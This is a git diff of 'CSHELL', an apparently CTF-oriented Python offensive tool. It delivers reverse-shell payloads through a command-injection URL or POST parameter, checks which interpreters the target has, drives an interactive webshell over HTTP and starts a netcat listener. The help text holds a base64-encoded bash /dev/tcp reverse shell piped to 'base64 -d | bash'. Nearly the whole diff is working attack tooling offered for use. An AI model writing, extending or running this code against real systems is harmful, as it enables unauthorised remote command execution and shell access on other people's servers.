@@ -75,8 +75,7 @@ def aerr(text) :
 # stating banner 
 #=================================================================================================================================================	
 def banner(): 
-	colors = ["\033[31" , "\033[32" , "\033[33" , "\033[34" , "\033[35" , "\033[36" ,"\033[91" , "\033[92" , "\033[93" , "\033[94" , "\033[94" ,"\033[96"] #contains some color code
-	os.system("""echo '
+	print("""
  ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
 ▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
@@ -86,14 +85,50 @@ def banner():
   ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
 ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
-░                                                
- '| $(/usr/bin/which lolcat)""") # picks random colors from colors array and display the banner with that color and reset the collor using \033[0m
+░                                                """) 
+
+
+#=================================================================================================================================================	
+#this function prints the info page which contains ip, port, target, payload, and payload-type
+#=================================================================================================================================================	
+def info(type, target , ip="0.0.0.0", port="1337" , payloadtype="bash" , base64encode=False , startlistener=True ): 
+	now = datetime.now()
+	dttime = now.strftime("%d-%m-%Y %H:%M:%S") # takes the time 
+	print("========================================================================================================")
+	print("CSHELL | By 0z09e | Twitter => https://twitter.com/0z09e")
+	print("========================================================================================================")
+	if type == 'rev':
+		ainfo(f"Target\t\t{target}")
+		ainfo(f"Listening IP\t{ip}")
+		ainfo(f"Listening Port\t{str(port)}")
+		ainfo(f"Payload format\t{payloadtype}")
+		ainfo("Payload\t\t" + payloads_dict.get(payloadtype).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))) # This replace the target ip and port with the actual Attacker ip and port
+	elif type == 'lstnr':
+		ainfo(f"Listening IP\t{ip}")
+		ainfo(f"Listening Port\t{str(port)}")
+		ainfo(f"Payload format\t{payloadtype}")
+	elif type == "web":
+		ainfo(f"Target\t\t{target}")	
+	print("========================================================================================================")
+	ap(f"Starting CSHELL at {dttime}")
+	print("========================================================================================================")
+
+#=================================================================================================================================================	
+# This function prints out the payload if --list_formats flags is set 
+#=================================================================================================================================================	
+def payload_list():
+	print("========================================================================================================")
+	print("Format-Name\t\t\tPayload")
+	print("========================================================================================================")
+	for key,value in payloads_dict.items(): #This prints all payloads
+		print(key + value)
+
 
 
 #=================================================================================================================================================	
 # This function checks the avalibility of the target, if the target is reachable or not. and it also checks if the .php file is there or not
 #=================================================================================================================================================	
-def avalability_check(target , type , method , param):
+def avalability_check(target , type , method , param , data):
 	ainfo("Checking avalability of the Address")
 	splitted_target = list(map(str , target.split('/'))) # Splitts the .php file from the url example. 'cmd.php' from http://127.0.0.1/cmd.php
 
@@ -102,8 +137,8 @@ def avalability_check(target , type , method , param):
 			splitted_php_param = list(map(str, splitted_target[-1].split("?")))
 			r = requests.get(target.replace(type , 'id')) # Checks the availibility of the target by sending a get request
 		elif method == "POST":
-			proxydict = {'http' : 'http://127.0.0.1:8080'}
-			data = {param : 'id'}
+#			proxydict = {'http' : 'http://127.0.0.1:8080'}
+			data = {param : data.replace(type , 'id')}
 			r = requests.post(target , data=data)
 
 		ap("Address is alive")
@@ -112,7 +147,6 @@ def avalability_check(target , type , method , param):
 				ap(f"Found : {splitted_php_param[0]}")
 			elif method == "POST":
 				ap(f"Found : {splitted_target[-1]}")
-			print(r.text)
 			if 'uid' in r.text and 'gid' in r.text and 'groups' in r.text: #checks if uid, gid and groups are available on the response
 				ap("Command executed successfully") 
 				return True
@@ -138,13 +172,13 @@ def avalability_check(target , type , method , param):
 #=================================================================================================================================================	
 # This function checks for the base of the payload example. 'bash' in bash -i /dev/tc..
 #=================================================================================================================================================	
-def payload_base_test(target , payloadtype , method , param):
+def payload_base_test(target , payloadtype , method , param, data ):
 	payloadtype = list(map(str , payloadtype.split("-")))[0] #splits the payload base from the payloadtype as bash-196 which wlso uses bash, so we have to split bash-196 using '-' inorder to get the base
 	ainfo(f"Testing the avalability of {payloadtype} on the target")
 	if method == "GET":
 		r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}")#sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
 	elif method == "POST":
-		data = {param : f"which {payloadtype}"}
+		data = {param : data.replace("REV" , f"which {payloadtype}")}
 		r = requests.post(target , data)
 	if r.text != "": # This line checks if the response is not blank, if it blanks that means base isn't available
 		ap(f"{payloadtype} is available")
@@ -157,7 +191,7 @@ def payload_base_test(target , payloadtype , method , param):
 #=================================================================================================================================================	
 # This function sends the payload 
 #=================================================================================================================================================	
-def send_payload(target , payload ,fmt , port , method, param ,nolstn=False):
+def send_payload(target , payload ,fmt , port , method, param ,data,nolstn=False):
 	try:
 
 		if method.upper() == "GET":
@@ -173,7 +207,7 @@ def send_payload(target , payload ,fmt , port , method, param ,nolstn=False):
 				ainfo("Sending payload. Good luck :)")
 				requests.get(target.replace("REV" , urllib.parse.quote_plus(payload)))
 		elif method.upper() == "POST":
-			data = {param : payload }
+			data = {param : data.replace("REV" , payload) }
 			if nolstn:
 				try:
 					requests.post(target , data=data , timeout=2)
@@ -208,42 +242,6 @@ def payloads(fmt , ip , port , method):
 		aerr("Exitting..")
 		exit()
 
-#=================================================================================================================================================	
-# This function prints out the payload if --list_formats flags is set 
-#=================================================================================================================================================	
-def payload_list():
-	print("========================================================================================================")
-	print("Format-Name\t\t\tPayload")
-	print("========================================================================================================")
-	for key,value in payloads_dict.items(): #This prints all payloads
-		print(key + value)
-
-#=================================================================================================================================================	
-#this function prints the info page which contains ip, port, target, payload, and payload-type
-#=================================================================================================================================================	
-def info(type, target , ip="0.0.0.0", port="1337" , payloadtype="bash" , base64encode=False , startlistener=True ): 
-	now = datetime.now()
-	dttime = now.strftime("%d-%m-%Y %H:%M:%S") # takes the time 
-	print("========================================================================================================")
-	print("By 0z09e | Twitter => https://twitter.com/0z09e")
-	print("========================================================================================================")
-	if type == 'rev':
-		ainfo(f"Target\t\t{target}")
-		ainfo(f"Listening IP\t{ip}")
-		ainfo(f"Listening Port\t{str(port)}")
-		ainfo(f"Payload format\t{payloadtype}")
-		ainfo("Payload\t\t" + payloads_dict.get(payloadtype).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))) # This replace the target ip and port with the actual Attacker ip and port
-	elif type == 'lstnr':
-		ainfo(f"Listening IP\t{ip}")
-		ainfo(f"Listening Port\t{str(port)}")
-		ainfo(f"Payload format\t{payloadtype}")
-		ainfo(f"Base64 Encoding\t{str(base64encode)}")
-		ainfo(f"Start Listener\t{str(startlistener)}")
-	elif type == "web":
-		ainfo(f"Target\t\t{target}")	
-	print("========================================================================================================")
-	ap(f"{dttime} Starting CSHELL")
-	print("========================================================================================================")
 
 
 #=================================================================================================================================================	
@@ -295,26 +293,25 @@ def webshell_help(cmd=None):
 #	This function sends every command to the webshell
 #=================================================================================================================================================	
 
-def webshell(target ,method , param):
+def webshell(target ,method , param , data):
 	try:
 		ainfo("Use 'help' to see cshell-web commands")
 		ap("Spawning prompt..")
 		time.sleep(2)
+		raw_data = data
 		if method == "GET":
 			r = requests.get(target.replace('WEB' , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]"))
 		elif method == "POST":
-			data = {param : "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]"}
-			r = requests.post(target , data=data)
+			prompt_data = {param : data.replace("WEB" , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]")}
+			r = requests.post(target , data=prompt_data)
 		prompt_request = list(map( str , r.text.split("\n")))
 
-# Sample output : [OUTPUT_START][PWD_START]/home/test[PWD_END][HOSTNAME_START]ubuntu[HOSTNAME_END][WHOAMI_START]test[WHOAMI_END][OUTPUT_END]
+		# Sample output : [OUTPUT_START][PWD_START]/home/test[PWD_END][HOSTNAME_START]ubuntu[HOSTNAME_END][WHOAMI_START]test[WHOAMI_END][OUTPUT_END]
 		for line in prompt_request:
 			if '[OUTPUT_START]' in line and '[OUTPUT_END]' in line:
 				pwd = line.split("[OUTPUT_START][PWD_START]")[1].split("[PWD_END][HOSTNAME_START]")[0]
 				hostname = line.split("[PWD_END][HOSTNAME_START]")[1].split("[HOSTNAME_END][WHOAMI_START]")[0]
 				whoami = line.split("[HOSTNAME_END][WHOAMI_START]")[1].split("[WHOAMI_END][OUTPUT_END]")[0]
-
-
 		
 		print("\x1b[2J\x1b[H",end="") #This clears the screen
 		readline.parse_and_bind('tab: complete')
@@ -328,8 +325,10 @@ def webshell(target ,method , param):
 					cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
 					res = requests.get(f"{target.replace('WEB' , cmd)}")
 				elif method == "POST":
-					data = {param :f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]" }
-					res = requests.post(target , data=data)
+					cmd = f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]"
+					value =  raw_data.replace("WEB" , cmd )
+					cmd_data = {param : value }
+					res = requests.post(target , data=cmd_data)
 
 				 # Replacing the web parameter with the cmd
 				# Filtering the response and sorting necessary responses
@@ -362,13 +361,13 @@ def get_ip_address(ifname):
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', ifname[:15]))[20:24]) #returns the extracted ip from the interface name
 	else:
-		aerr("Interface name not found")
+		aerr(f"Interface \'{ifname}\' not found")
 		ap(f"Available Inferfaces [{', '.join(os.listdir('/sys/class/net/'))}]")
 		sys.exit()
 #=================================================================================================================================================
 #	This function generate anc copies the payload to the clipboard and starts listener 
 # ======================================================================================
-def listener(ifname , port , payload_type='bash' , startlistener=False , base64encode=False):
+def listener(ifname , port , payload_type='bash' , nolistener=True , base64encode=False):
     try: #checks if -i parameter is interface name or IP
         if IP(ifname):
             ip = ifname
@@ -390,7 +389,7 @@ def listener(ifname , port , payload_type='bash' , startlistener=False , base64e
     pc.copy(payload) #copy the payload into the clipboard
     ap(f"Payload => {payload}")
     ap("Payload has been copied to your clipboard")
-    if startlistener: #starts the listener
+    if not nolistener: #starts the listener
         ainfo("Starting netcat listener")
         os.system(f"nc -lvnp {port}")
 
@@ -419,7 +418,7 @@ def main():
 	rev.add_argument('--nolstn' , action='store_true' , required=False , help="Don't start the listener" )
 	rev.add_argument('-p', metavar='Listening-Port' , required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
 	rev.add_argument('-m', metavar='method' , required=False ,default="GET" ,help='Method of sending the request, Example : GET, POST')
-	rev.add_argument('-P', metavar='Parameter' , required=False ,default='cmd' , help='Post request parameter. [Default - cmd]')
+	rev.add_argument('-d', metavar='Data' , required=False ,default='cmd=REV' , help='Data format of the Post request.(Send REV as a command), Example & Default Value : \'cmd=REV\'')
 
 	rev_required = rev.add_argument_group('required arguments')
 	rev_required.add_argument('-i', metavar='Listening-IP' , required=True , help='Attacker\'s IP or Interface name for reciving reverse shell')
@@ -431,7 +430,7 @@ def main():
 	# web shell arguments
 	web = subparsers.add_parser("web" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It takes a working reverse shell as an argument and executes command on that reverse shell in real time,\n\t      This also shows error message and persists the working directory')
 	web.add_argument('-m', metavar='method' , required=False ,default="GET" ,help='Method of sending the request, Example : GET, POST')
-	web.add_argument('-P', metavar='Parameter' , required=False ,default='cmd' , help='Post request parameter. [Default - cmd]')
+	web.add_argument('-d', metavar='data' , required=False ,default='cmd=WEB' , help='Data format of the Post request. If multiple data needs to be send, seperate each data with \'&\'.(Send WEB as a command) , Example & Default Value : \'cmd=WEB\'')
 	web_required = web.add_argument_group('positional arguments')
 	web_required.add_argument('target',  metavar="Target" , help="Target URL with 'WEB' as a command. Example : http://127.0.0.1/webshell.php?cmd=WEB")
 
@@ -441,26 +440,51 @@ def main():
 	lstn = subparsers.add_parser("lstnr" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It generates and copies whatever payload from the payload list [You can list all the payloads using \'--payloads\']. it also starts a listener [Optional].')
 	lstn.add_argument("-p" , metavar="Port" , required=False , default=1337 , help="Reverse shell's port. [Default : 1337]")
 	lstn.add_argument("-f" , metavar="Format" , required=False , default="bash" , help="Reverse shell's format. [Default : bash]")
-	lstn.add_argument("--lstn" , action='store_true' , required=False , help="Start the listener")
+	lstn.add_argument("--nolstn" , action='store_true' , required=False , help="Start the listener")
 	lstn.add_argument("--b64" , action='store_true' , required=False , help="Encode the payload in base64 format. Example payload : echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTAwMSAwPiYxCg== | base64 -d | bash")
-	lstn_required = lstn.add_argument_group("required arguments")
-	lstn_required.add_argument("-i" , metavar="IP" , required=True , help="IP in which you want to send the reverse shell or you can specify the network interface. Example : -i 10.10.10.10 OR -i tun0")
+	lstn.add_argument("-i" , metavar="Interface" , default='tun0', help="IP in which you want to send the reverse shell or you can specify the network interface. Example : -i 10.10.10.10 OR -i tun0, Default Value : \'tun0\'")
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 	
 	args = myparser.parse_args()
 
+#=====================================================================================================================================================
+
 	if args.command == "rev":
-			banner()
 			url = args.target
 			ip = args.i
 			port = args.p
 			fmt = args.f
 			nolstn = args.nolstn
 			method = args.m.upper()
+			data = args.d
 
 			if method == "GET" or method == "POST":
-				param = args.P
+				if method == "POST":
+					if "REV" in data:
+						if "&" in data:
+							data = data.split("&")
+							for each in data:
+								if "REV" in each:
+									splitted_data = each.split('=')
+									param = splitted_data[0]
+									data = splitted_data[1]
+						else:
+							splitted_data = data.split('=')
+							param = splitted_data[0]
+							data = splitted_data[1]
+
+					else:
+						aerr("\'REV\' not found on data")
+						sys.exit()
+				elif method == "GET":
+					if "REV" not in url: #check the rev word
+						aerr(f"\'REV\' not found on Target URL")
+						sys.exit()
+					else:
+						param = ""
+
+
 			else:
 				aerr("Method not found , Available Methods = ['GET' , 'POST']")
 				sys.exit()
@@ -471,9 +495,7 @@ def main():
 			except ValueError: # takes ip from interface
 				ip = get_ip_address(ip)
 
-			if method == "GET" and "REV" not in url: #check the rev word
-				aerr(f"\'REV\' not found on Target URL")
-				sys.exit()
+
 			if fmt not in list(payloads_dict.keys()):
 				aerr("Format not found")
 				ainfo("Shifting to defaut format : bash")
@@ -482,36 +504,69 @@ def main():
 				aerr("Port is out of range, expected between 1-65535")
 				aerr("Exitting...")
 				sys.exit()
-
 			info( "rev" , url , ip , port , fmt , 'rev')
-			if avalability_check(url  , "REV" , method , param) and payload_base_test(url , fmt , method , param):
-				send_payload(url , payloads(fmt , ip , port , method), fmt , str(port) , method , param, nolstn=nolstn)
+			if avalability_check(url  , "REV" , method , param , data) and payload_base_test(url , fmt , method , param , data):
+				send_payload(url , payloads(fmt , ip , port , method), fmt , str(port) , method , param, data, nolstn=nolstn)
+
+#=====================================================================================================================================================
+
 
 	elif args.command == "web":
-		banner()
 		url = args.target
 		method = args.m.upper()
+		data = args.d
 
 		if method == "GET" or method == "POST":
-			param = args.P
-		if method == "GET" and "WEB" not in url:
-			aerr(f"\'WEB\' not found on Target URL")
+			if method == "GET":
+				if "WEB" not in url:			
+					aerr(f"\'WEB\' not found on Target URL")			
+					sys.exit()
+				else:
+					param = ""
+			elif method == "POST":
+				if "WEB" in data:
+					if '&' in data:
+						data = args.d.split("&")
+						for each in data:
+							if "WEB" in each:
+								splitted_data = each.split('=')
+								param = splitted_data[0]
+								data = splitted_data[1]
+					else:
+						splitted_data = data.split('=')
+						param = splitted_data[0]
+						data = splitted_data[1]
+
+				else:
+					aerr("\'WEB\' not found on data")
+					sys.exit()
+		else:
+			print(f"Method : \'{method}\' Not found. Available Methods ['GET' , 'POST']")
 			sys.exit()
+
+
 		info("web" , url)
-		if avalability_check(url , "WEB" , method , param):
-			webshell(url , method , param)
+		if avalability_check(url , "WEB" , method , param , data):
+			webshell(url , method , param , data)
+
+#=====================================================================================================================================================
+
+
 	elif args.command == "lstnr":
-		banner()
 		ip = args.i
 		port = args.p
 		fmt = args.f
-		lstn = args.lstn
+		nolstn = args.nolstn
 		b64 = args.b64
-		info("lstnr" , None , ip , port=port, base64encode=b64 , startlistener=lstn , payloadtype=fmt)
-		listener(ip , port , payload_type=fmt , startlistener=lstn , base64encode=b64)
+		info("lstnr" , None , ip , port=port , payloadtype=fmt)
+		listener(ip , port , payload_type=fmt , nolistener=nolstn , base64encode=b64)
 	elif args.payloads:
 		payload_list()
 	else:
 		banner()
 		myparser.print_help()
-main()
+
+#====================================================================< Function Ends Here >=================================================================================
+
+if __name__ == "__main__":
+	main()
